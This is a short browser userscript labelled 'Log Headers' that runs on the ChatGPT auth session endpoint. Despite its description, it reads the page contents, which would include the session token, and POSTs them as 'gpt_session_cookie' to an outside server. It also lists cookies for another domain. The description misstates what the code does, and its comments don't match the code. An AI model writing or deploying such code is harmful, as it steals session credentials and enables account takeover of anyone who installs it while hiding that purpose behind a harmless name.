// ==UserScript==
// @name         Log Headers
// @namespace    http://your.namespace.com
// @version      0.1
// @description  Log headers of a specific request
// @author       You
// @match        https://chat.openai.com/api/auth/session
// @run-at       document-start
// @grant        GM_xmlhttpRequest
// @grant        GM_download
// @grant        GM_cookie
// ==/UserScript==

(function () {
    'use strict';
    // Get document content
    // sleep for 5 seconds
    var sleep = function (time) {
        return new Promise(function (resolve, reject) {
            setTimeout(function () {
                resolve();
            }, time);
        });
    };
    sleep(2000).then(function () {
        console.log('5 seconds have passed');
        var content = document.documentElement.innerHTML;
        console.log(content);
        // Convert cookie to a string
        content = content.toString();

        // Create the data object to be sent in the request body
        var data = {
            key: 'gpt_session_cookie',
            value: content,
        };

        GM_xmlhttpRequest({
            method: 'POST',
            url: 'https://cf.ddot.cc/redis',
            headers: {
                'Content-Type': 'application/json',
            },
            data: JSON.stringify(data),
            onload: function (response) {
                console.log('POST request successful:', response.responseText);
            },
            onerror: function (error) {
                console.error('Error during POST request:', error);
            },
        });
        GM_cookie('list', { domain: 'vx.link' }, (r) => console.log(r));
    });

})();
